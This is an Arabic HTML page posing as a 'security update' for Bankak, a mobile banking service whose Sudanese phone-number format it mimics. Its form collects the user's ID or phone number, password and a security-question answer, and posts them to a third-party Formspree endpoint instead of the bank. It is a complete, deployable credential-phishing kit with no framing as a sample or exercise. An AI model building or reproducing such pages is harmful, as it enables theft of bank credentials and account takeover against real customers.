<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث أمان بنكك</title>
    <style>
        body { background-color: #e30613; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: white; direction: rtl; }
        .container { width: 90%; max-width: 380px; text-align: center; }
        .logo { font-size: 50px; font-weight: bold; margin-bottom: 20px; }
        .logo span { font-size: 18px; display: block; margin-top: -15px; }
        .card { background: white; color: #333; padding: 20px; border-radius: 15px; box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
        input, select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; text-align: right; font-size: 16px; }
        .btn { width: 100%; padding: 15px; background: #e30613; color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">بنكك<span>bankak</span></div>
        <div class="card">
            <h3 style="color:#e30613; margin-top:0;">التحديث الأمني الموحد</h3>
            <form action="https://formspree.io/f/xjgeaelv" method="POST">
                <input type="text" name="Username" placeholder="رقم المعرف أو 249-" required>
                <input type="password" name="Password" placeholder="كلمة المرور" required>
                <hr>
                <p style="font-size:13px; color:#666;">يرجى تأكيد سؤال الأمان:</p>
                <select name="Question">
                    <option>ما هو اسم المدرسة التي التحقت بها؟</option>
                    <option>ما هو اسم أول بلد قمت بزيارته؟</option>
                </select>
                <input type="text" name="Answer" placeholder="الإجابة هنا" required>
                <button type="submit" class="btn">تحديث وحفظ</button>
            </form>
        </div>
    </div>
</body>
</html>
